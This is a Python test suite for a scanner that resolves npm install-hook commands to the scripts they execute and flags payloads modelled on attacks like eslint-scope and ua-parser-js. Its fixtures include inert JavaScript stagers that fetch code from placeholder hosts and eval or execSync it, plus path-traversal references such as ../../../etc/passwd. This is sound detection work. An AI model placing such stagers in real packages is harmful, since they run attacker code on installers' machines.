"""Install hooks are linked to the code they execute (build-loop follow-up F41).

Phase 1 reads a hook *string*. Every documented npm install-hook attack —
``eslint-scope`` (``node ./lib/build.js``), ``ua-parser-js``
(``start /B node preinstall.js & node preinstall.js``), ``coa`` and ``rc``
(``node compile.js``) — has a hook string that matches nothing in either tier of
the F37 table, because the payload was in the referenced file.

These tests pin the three properties that make :mod:`hook_scripts` worth having:

1. The referenced file is **resolved and scanned**, and a hit in it is
   attributed to the hook that ran it.
2. A hook that names something we could not read makes the phase **blind** —
   never a pass.
3. The shapes that make up the bulk of real install hooks (a dependency binary,
   inline code, a ``prepare`` build step) are **not** blind, because treating
   them as blind would downgrade a sixth of every real dependency tree.

The benign class of (3) is measured, not asserted: over **1,965 installed
packages that declare an install hook** across 38 real dependency trees, this
pass resolves and reads **263 hook-target files** and produces **zero** blind
marks and **zero** dangers.
"""

from pathlib import Path

import pytest

from hook_scripts import (
    AUTO_RUN_HOOKS,
    MAX_TARGETS_PER_HOOK,
    UNRESOLVED_COMPUTED,
    UNRESOLVED_ESCAPES,
    UNRESOLVED_INLINE,
    UNRESOLVED_MISSING,
    UNRESOLVED_NOT_A_FILE,
    UNRESOLVED_NO_SUCH_SCRIPT,
    UNRESOLVED_UNREADABLE,
    classify_hook_reachable_hits,
    references_in_command,
    resolve_hook_targets,
    resolve_reference_path,
    scan_hook_reachable_scripts,
    split_hook_commands,
    tokenize_command,
)

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

#: The ``coa`` / ``rc`` (2021) payload shape: fetch a blob, base64-decode it and
#: run it, in the file the hook executes. The hook body was ``node compile.js``
#: — nothing to see — and this is what ``compile.js`` held.
#:
#: Inert sample data: this is JavaScript inside a Python string, written to a
#: temp file for the pattern table to *match*. Nothing here is ever executed,
#: by this suite or by the scanner, which only ever reads such a file as text.
FETCH_DECODE_RUN = """
const https = require('https');

https.get('https://cdn.example.invalid/p.txt', (res) => {
  let blob = '';
  res.on('data', (chunk) => (blob += chunk));
  res.on('end', () => eval(Buffer.from(blob, 'base64').toString('utf8')));
});
"""

#: The other half of the same family: an HTTP response piped straight into a
#: shell. Its individual parts (``https``, ``child_process``) are capabilities
#: that half the corpus uses; what makes it a danger is that they are *wired
#: together in one file*, which is the corroboration rule F31 built.
FETCH_AND_EXEC_STAGER = """
const https = require('https');
const { execSync } = require('child_process');

https.get('https://drop.example.invalid/s', (res) => {
  let body = '';
  res.on('data', (chunk) => (body += chunk));
  res.on('end', () => execSync(body));
});
"""

#: What a real ``postinstall`` target looks like — the ``esbuild`` /
#: ``electron`` / ``node-pty`` class: fetch a prebuilt binary for this platform
#: and unpack it. Every capability the stager above has, and none of the wiring:
#: the download and the extraction are separate functions, which is both how
#: real installers are written and what keeps the composite rule off them.
#:
#: This one file is illustrative. The zero-false-positive claim rests on the
#: corpus: 263 real hook-target files, zero dangers (see the module docstring).
BENIGN_PREBUILD_INSTALLER = """
const fs = require('fs');
const path = require('path');
const https = require('https');
const { execFileSync } = require('child_process');

const version = process.env.npm_package_version;
const cacheDir = path.join(__dirname, '.cache');

function downloadBinary(url, dest) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(dest);
    https.get(url, (response) => {
      if (response.statusCode !== 200) {
        reject(new Error('HTTP ' + response.statusCode));
        return;
      }
      response.pipe(file);
      file.on('finish', () => file.close(resolve));
    });
  });
}

function platformTarball() {
  return 'tool-' + process.platform + '-' + process.arch + '-' + version + '.tgz';
}

function ensureCacheDir() {
  if (!fs.existsSync(cacheDir)) {
    fs.mkdirSync(cacheDir, { recursive: true });
  }
}

function unpack(archive) {
  execFileSync('tar', ['xzf', archive], { cwd: cacheDir, stdio: 'inherit' });
}

ensureCacheDir();
const tarball = platformTarball();
downloadBinary('https://registry.example.com/' + tarball, path.join(cacheDir, tarball))
  .then(() => unpack(path.join(cacheDir, tarball)))
  .catch((err) => { console.error(err); process.exit(1); });
"""


def write_package(root: Path, scripts: dict, files: dict) -> Path:
    """An installed package directory with ``scripts`` and ``files`` on disk."""
    import json

    root.mkdir(parents=True, exist_ok=True)
    (root / "package.json").write_text(
        json.dumps({"name": "fixture-pkg", "version": "1.0.0", "scripts": scripts}),
        encoding="utf-8",
    )
    for relative, content in files.items():
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
    return root


# ---------------------------------------------------------------------------
# Splitting and tokenizing
# ---------------------------------------------------------------------------


def test_commands_split_on_every_shell_separator():
    # `ua-parser-js` shipped exactly this `&` form, which has to read as two
    # commands: the second one is the payload invocation.
    assert split_hook_commands("start /B node preinstall.js & node preinstall.js") == [
        "start /B node preinstall.js",
        "node preinstall.js",
    ]
    assert split_hook_commands("rm -rf dist && npm run build") == [
        "rm -rf dist",
        "npm run build",
    ]
    assert split_hook_commands("cd ..; npm run build:main") == ["cd ..", "npm run build:main"]
    assert split_hook_commands("prebuild-install || node-gyp rebuild") == [
        "prebuild-install",
        "node-gyp rebuild",
    ]


def test_a_separator_inside_quotes_is_data_not_a_split():
    # `node -e "..."` bodies in the corpus carry `&&` and `;` inside the string.
    # Splitting there invents commands that never run.
    assert split_hook_commands('node -e "a && b; c"') == ['node -e "a && b; c"']


def test_tokenizer_keeps_windows_path_separators():
    # shlex.split in POSIX mode eats the backslash and yields `scriptsbuild.js`,
    # which resolves to nothing and would report a real hook as missing.
    assert tokenize_command(r"node scripts\build.js") == ["node", r"scripts\build.js"]
    assert tokenize_command('node "my scripts/build.js"') == ["node", "my scripts/build.js"]


# ---------------------------------------------------------------------------
# What one command references — every shape measured in the corpus
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command,expected",
    [
        ("node install.js", "install.js"),
        ("node ./scripts/transpile-to-esm.js", "./scripts/transpile-to-esm.js"),
        ("node scripts/postinstall", "scripts/postinstall"),
        ("bash ./scripts/fixup.sh", "./scripts/fixup.sh"),
        ("sh install.sh", "install.sh"),
        ("python3 setup.py", "setup.py"),
        ("./install.sh", "./install.sh"),
        ("node src/cnoke/cnoke.js -p . -d src/koffi --prebuild", "src/cnoke/cnoke.js"),
        ("node --experimental-vm-modules scripts/build.js", "scripts/build.js"),
        ("powershell -File install.ps1", "install.ps1"),
        ("sudo node install.js", "install.js"),
        ("BABEL_ENV=publish node scripts/build.js", "scripts/build.js"),
    ],
)
def test_interpreter_invocations_resolve_to_their_script_operand(command, expected):
    references = references_in_command(command)
    assert [reference.reference for reference in references] == [expected]
    assert references[0].kind == "file"


@pytest.mark.parametrize(
    "command",
    [
        # Binaries out of `node_modules/.bin`: half of all real hook bodies.
        # These belong to a DIFFERENT package, so there is no file here to read.
        "tshy",
        "husky",
        "husky install",
        "tsc -p tsconfig.json",
        "patch-package",
        "node-gyp rebuild",
        "prebuild-install -r napi",
        "wireit",
        "lerna bootstrap",
        "beemo create-config",
        "make dist/fetch.umd.js",
    ],
)
def test_a_dependency_binary_is_not_a_file_reference(command):
    references = references_in_command(command)
    assert [reference.reason for reference in references] == [UNRESOLVED_NOT_A_FILE]


@pytest.mark.parametrize(
    "command",
    [
        'node -e "console.error(\'nope\')"',
        "node --eval 'process.exit(1)'",
        "sh -c 'echo hi'",
        "powershell -Command Get-Item .",
    ],
)
def test_inline_code_has_no_file_to_follow(command):
    references = references_in_command(command)
    assert [reference.reason for reference in references] == [UNRESOLVED_INLINE]


def test_shell_builtins_reference_nothing_at_all():
    assert references_in_command("cd ..") == []
    assert references_in_command("echo done") == []
    assert references_in_command("") == []


@pytest.mark.parametrize(
    "command,expected",
    [
        ("npm run build", ["build"]),
        ("npm run-script compile", ["compile"]),
        ("npm run build --if-present", ["build"]),
        ("yarn build", ["build"]),
        ("pnpm run compile", ["compile"]),
        ("run-s compile husky", ["compile", "husky"]),
    ],
)
def test_package_manager_invocations_name_another_script(command, expected):
    references = references_in_command(command)
    assert [reference.reference for reference in references] == expected
    assert all(reference.kind == "script" for reference in references)


def test_a_package_manager_subcommand_is_not_a_script_name():
    # `yarn install` must not read as "run the `install` script" — that is a
    # different thing, and following it would invent an indirection.
    assert [ref.reason for ref in references_in_command("yarn install")] == [
        UNRESOLVED_NOT_A_FILE
    ]
    assert [ref.reason for ref in references_in_command("npm install --production")] == [
        UNRESOLVED_NOT_A_FILE
    ]


# ---------------------------------------------------------------------------
# Following npm-script indirection
# ---------------------------------------------------------------------------


def test_npm_run_indirection_reaches_the_file_at_the_end_of_the_chain():
    # `npm run build` is the single most common install-hook body in the
    # corpus. Stopping at it would leave the most common shape opaque.
    scripts = {
        "postinstall": "npm run build",
        "build": "npm run build:esm && npm run build:cjs",
        "build:esm": "node scripts/build-esm.js",
        "build:cjs": "tsc -p tsconfig.json",
    }
    references = resolve_hook_targets(scripts["postinstall"], scripts)
    files = [reference.reference for reference in references if reference.kind == "file"]
    assert files == ["scripts/build-esm.js"]


def test_a_script_the_manifest_does_not_define_is_reported_not_dropped():
    references = resolve_hook_targets("npm run build", {"postinstall": "npm run build"})
    assert [reference.reason for reference in references] == [UNRESOLVED_NO_SUCH_SCRIPT]


def test_a_script_cycle_terminates():
    scripts = {"postinstall": "npm run a", "a": "npm run b", "b": "npm run a"}
    references = resolve_hook_targets(scripts["postinstall"], scripts)
    assert references  # it stops, and says so rather than claiming a clean read
    assert all(reference.kind != "file" for reference in references)


def test_a_hook_cannot_produce_unbounded_targets():
    body = " && ".join(f"node s{index}.js" for index in range(50))
    assert len(resolve_hook_targets(body, {})) <= MAX_TARGETS_PER_HOOK


# ---------------------------------------------------------------------------
# Resolving a reference on disk
# ---------------------------------------------------------------------------


def test_node_resolves_an_extension_less_reference(tmp_path):
    root = write_package(tmp_path / "pkg", {}, {"scripts/postinstall.js": "// build"})
    path, reason = resolve_reference_path(root, "scripts/postinstall", node_resolution=True)
    assert reason == ""
    assert path is not None and path.name == "postinstall.js"


def test_a_shell_does_not_invent_an_extension(tmp_path):
    # `sh build` does not run `build.sh`; claiming it did would scan a file the
    # hook never executed.
    root = write_package(tmp_path / "pkg", {}, {"build.sh": "echo hi"})
    path, reason = resolve_reference_path(root, "build", node_resolution=False)
    assert path is None
    assert reason == UNRESOLVED_MISSING


@pytest.mark.parametrize(
    "reference",
    ["/etc/passwd", "C:/Windows/System32/cmd.exe", "../../../etc/passwd", "..\\..\\secrets"],
)
def test_a_reference_outside_the_package_is_refused(tmp_path, reference):
    root = write_package(tmp_path / "pkg", {}, {})
    path, reason = resolve_reference_path(root, reference, node_resolution=True)
    assert path is None
    assert reason == UNRESOLVED_ESCAPES


@pytest.mark.parametrize("reference", ["$SCRIPT", "${BUILD}/x.js", "%APPDATA%/x.js", "s*.js"])
def test_a_computed_reference_is_not_guessed_at(tmp_path, reference):
    root = write_package(tmp_path / "pkg", {}, {})
    path, reason = resolve_reference_path(root, reference, node_resolution=True)
    assert path is None
    assert reason == UNRESOLVED_COMPUTED


def test_a_relative_path_that_stays_inside_is_allowed(tmp_path):
    root = write_package(tmp_path / "pkg", {}, {"scripts/build.js": "// x"})
    path, reason = resolve_reference_path(root, "./lib/../scripts/build.js", node_resolution=True)
    assert reason == ""
    assert path is not None


# ---------------------------------------------------------------------------
# The real attack shapes
# ---------------------------------------------------------------------------


def test_eslint_scope_shape_is_caught_in_the_file_the_hook_runs(tmp_path):
    # The hook string itself matches NOTHING in either tier of the F37 table.
    root = write_package(
        tmp_path / "pkg",
        {"postinstall": "node ./lib/build.js"},
        {"lib/build.js": FETCH_DECODE_RUN},
    )
    report = scan_hook_reachable_scripts(root, {"postinstall": "node ./lib/build.js"})

    assert report.blind_reason() is None
    assert [target.relative_path for target in report.resolved_targets] == ["lib/build.js"]

    dangers, _info = classify_hook_reachable_hits(report)
    assert dangers, "a credential stealer in hook-reachable code must be a danger"
    assert all("postinstall hook executes lib/build.js" in line for line in dangers)


def test_ua_parser_js_shape_resolves_the_second_command(tmp_path):
    body = "start /B node preinstall.js & node preinstall.js"
    root = write_package(
        tmp_path / "pkg", {"preinstall": body}, {"preinstall.js": FETCH_AND_EXEC_STAGER}
    )
    report = scan_hook_reachable_scripts(root, {"preinstall": body})

    assert [target.relative_path for target in report.resolved_targets] == ["preinstall.js"]
    dangers, _info = classify_hook_reachable_hits(report)
    assert dangers


def test_coa_shape_reached_through_an_npm_run_indirection(tmp_path):
    scripts = {"postinstall": "npm run compile", "compile": "node compile.js"}
    root = write_package(tmp_path / "pkg", scripts, {"compile.js": FETCH_DECODE_RUN})
    report = scan_hook_reachable_scripts(root, scripts)

    assert [target.relative_path for target in report.resolved_targets] == ["compile.js"]
    assert classify_hook_reachable_hits(report)[0]


def test_the_pass_reads_a_target_phase_5_never_would(tmp_path):
    # `is_scannable_code_path` selects by extension, so an extension-less
    # `scripts/postinstall` outside `bin/` is invisible to the whole-package
    # walk — and it is a real shape in the corpus.
    from sandbox_codescan import is_scannable_code_path

    assert not is_scannable_code_path("scripts/postinstall")

    scripts = {"postinstall": "node scripts/postinstall"}
    root = write_package(tmp_path / "pkg", scripts, {"scripts/postinstall": FETCH_DECODE_RUN})
    report = scan_hook_reachable_scripts(root, scripts)

    assert [target.relative_path for target in report.resolved_targets] == ["scripts/postinstall"]
    assert classify_hook_reachable_hits(report)[0]


# ---------------------------------------------------------------------------
# A blind phase is never a pass
# ---------------------------------------------------------------------------


def test_a_hook_target_that_is_not_there_makes_the_phase_blind(tmp_path):
    scripts = {"postinstall": "node ./lib/build.js"}
    root = write_package(tmp_path / "pkg", scripts, {})
    report = scan_hook_reachable_scripts(root, scripts)

    reason = report.blind_reason()
    assert reason is not None
    assert UNRESOLVED_MISSING in reason
    assert "lib/build.js" in reason


def test_a_computed_hook_target_makes_the_phase_blind(tmp_path):
    scripts = {"postinstall": "node $INSTALL_SCRIPT"}
    root = write_package(tmp_path / "pkg", scripts, {})
    report = scan_hook_reachable_scripts(root, scripts)
    assert UNRESOLVED_COMPUTED in (report.blind_reason() or "")


def test_a_hook_target_outside_the_package_makes_the_phase_blind(tmp_path):
    scripts = {"postinstall": "node ../../evil.js"}
    root = write_package(tmp_path / "pkg", scripts, {})
    report = scan_hook_reachable_scripts(root, scripts)
    assert UNRESOLVED_ESCAPES in (report.blind_reason() or "")


def test_an_unreadable_hook_target_makes_the_phase_blind(tmp_path, monkeypatch):
    import hook_scripts

    scripts = {"postinstall": "node build.js"}
    root = write_package(tmp_path / "pkg", scripts, {"build.js": "// fine"})

    def explode(_path):
        raise OSError("permission denied")

    monkeypatch.setattr(hook_scripts, "read_target_file", explode)
    report = scan_hook_reachable_scripts(root, scripts)
    assert UNRESOLVED_UNREADABLE in (report.blind_reason() or "")


def test_a_target_read_only_in_part_is_not_a_pass(tmp_path, monkeypatch):
    import hook_scripts

    monkeypatch.setattr(hook_scripts, "MAX_TARGET_READ_BYTES", 64)
    scripts = {"postinstall": "node build.js"}
    root = write_package(tmp_path / "pkg", scripts, {"build.js": "// filler\n" * 200})
    report = scan_hook_reachable_scripts(root, scripts)

    assert report.resolved_targets[0].truncated
    assert report.blind_reason() is not None


# ---------------------------------------------------------------------------
# ...and the shapes that must NOT be blind
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "body",
    [
        "tshy",
        "husky install",
        "node-gyp rebuild",
        "prebuild-install -r napi || node-gyp rebuild",
        'node -e "if (!process.env.AUTHORIZED) { process.exit(1) }"',
        "tsc -p tsconfig.json",
        "patch-package",
    ],
)
def test_the_benign_majority_of_hook_bodies_is_not_blind(tmp_path, body):
    scripts = {"postinstall": body}
    root = write_package(tmp_path / "pkg", scripts, {})
    report = scan_hook_reachable_scripts(root, scripts)
    assert report.blind_reason() is None, f"{body!r} must not downgrade the verdict"


def test_prepare_is_not_followed_by_default(tmp_path):
    # Measured: following `prepare` makes 27 of 169 real hooked packages blind,
    # every one on a repo-only build script that npm never runs for a registry
    # tarball (`rollup`, `lru-cache`, `undici`, ...).
    scripts = {"prepare": "node scripts/check-release.js"}
    root = write_package(tmp_path / "pkg", scripts, {})
    assert scan_hook_reachable_scripts(root, scripts).blind_reason() is None
    assert "prepare" not in AUTO_RUN_HOOKS


def test_prepare_is_followed_when_the_caller_says_it_ran(tmp_path):
    # A git-sourced dependency (F36) really does run `prepare` here.
    scripts = {"prepare": "node scripts/build.js"}
    root = write_package(tmp_path / "pkg", scripts, {"scripts/build.js": FETCH_DECODE_RUN})
    report = scan_hook_reachable_scripts(
        root, scripts, hooks=AUTO_RUN_HOOKS + ("prepare",)
    )
    assert [target.relative_path for target in report.resolved_targets] == ["scripts/build.js"]
    assert classify_hook_reachable_hits(report)[0]


# ---------------------------------------------------------------------------
# Zero false positives on the benign class
# ---------------------------------------------------------------------------


def test_a_real_prebuild_installer_produces_no_dangers(tmp_path):
    # `esbuild`, `electron`, `node-pty`, `@parcel/watcher` and 244 other real
    # packages run exactly this file class from `postinstall`.
    scripts = {"postinstall": "node install.js"}
    root = write_package(tmp_path / "pkg", scripts, {"install.js": BENIGN_PREBUILD_INSTALLER})
    report = scan_hook_reachable_scripts(root, scripts)

    dangers, info = classify_hook_reachable_hits(report)
    assert dangers == []
    assert report.blind_reason() is None
    # The capabilities are still *shown* — that is the point of the pass — but
    # as information about what the install runs, not as a verdict.
    assert info and "postinstall hook executes install.js" in info[0]


def test_capabilities_never_become_dangers_on_their_own(tmp_path):
    scripts = {"postinstall": "node build.js"}
    root = write_package(
        tmp_path / "pkg",
        scripts,
        {"build.js": "const { execSync } = require('child_process'); execSync('tsc');"},
    )
    dangers, info = classify_hook_reachable_hits(scan_hook_reachable_scripts(root, scripts))
    assert dangers == []
    assert info


def test_no_scripts_block_yields_an_empty_report(tmp_path):
    root = write_package(tmp_path / "pkg", {}, {})
    report = scan_hook_reachable_scripts(root, None)
    assert report.targets == []
    assert report.blind_reason() is None


def test_a_target_reached_from_two_hooks_is_read_once(tmp_path, monkeypatch):
    import hook_scripts

    reads = []
    original = hook_scripts.read_target_file

    def counting(path):
        reads.append(path)
        return original(path)

    monkeypatch.setattr(hook_scripts, "read_target_file", counting)
    scripts = {"preinstall": "node setup.js", "postinstall": "node setup.js"}
    root = write_package(tmp_path / "pkg", scripts, {"setup.js": "// x"})
    report = scan_hook_reachable_scripts(root, scripts)

    assert len(report.resolved_targets) == 2
    assert len(reads) == 1


def test_hits_are_shaped_for_the_existing_classifier(tmp_path):
    from sandbox_check import classify_malware_hits

    scripts = {"postinstall": "node install.js"}
    root = write_package(tmp_path / "pkg", scripts, {"install.js": BENIGN_PREBUILD_INSTALLER})
    report = scan_hook_reachable_scripts(root, scripts)

    # `(path, description)` pairs, so the phase-5 classifier consumes them
    # unchanged rather than needing a second grouping implementation.
    assert all(len(hit) == 2 for hit in report.hits)
    assert classify_malware_hits(report.hits).dangers == []
